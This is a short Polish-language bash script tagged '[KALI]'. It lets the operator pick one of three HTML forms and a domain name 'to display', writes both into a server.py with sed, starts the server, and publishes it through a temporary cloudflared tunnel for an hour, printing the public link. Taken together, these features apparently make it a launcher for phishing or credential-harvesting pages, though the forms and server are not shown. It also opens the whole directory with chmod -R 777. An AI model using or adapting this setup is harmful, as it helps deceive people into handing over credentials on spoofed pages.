#!/bin/bash

# 🔥 AUTOMATYCZNE NADANIE UPRAWNIEŃ
echo "[KALI] Nadaję uprawnienia katalogowi..."
sudo chmod -R 777 .

echo "=== KONFIGURACJA SERWERA ==="
echo "1 - form1.html"
echo "2 - form2.html"
echo "3 - form3.html"
echo ""

read -p "Wybierz numer formularza: " choice

case $choice in
  1) FORM="form1.html" ;;
  2) FORM="form2.html" ;;
  3) FORM="form3.html" ;;
  *) echo "Zły wybór"; exit 1 ;;
esac

read -p "Podaj domenę do wyświetlenia: " DOMAIN

# 🔥 PODMIANA W server.py
sed -i "s/selected_form = .*/selected_form = \"$FORM\"/" server.py
sed -i "s/domain = .*/domain = \"$DOMAIN\"/" server.py

echo "[KALI] Wybrano formularz: $FORM"
echo "[KALI] Ustawiono domenę: $DOMAIN"

# 🔥 URUCHOMIENIE SERWERA
python3 server.py &
SERVER_PID=$!

# 🔥 URUCHOMIENIE TUNELU
cloudflared tunnel --url http://localhost:8000 > tunnel.log 2>&1 &
TUNNEL_PID=$!

sleep 2

# 🔥 AUTOMATYCZNE WYŚWIETLENIE LINKU TUNELU
echo "[KALI] Link tunelu:"
grep -o "https://.*" tunnel.log

echo ""
echo "[KALI] Tunel uruchomiony. Link powyżej ↑"

# 🔥 CZAS DZIAŁANIA
sleep 3600

echo "[KALI] Zamykam serwer i tunel..."
kill $SERVER_PID
kill $TUNNEL_PID

echo "[KALI] Zakończono."
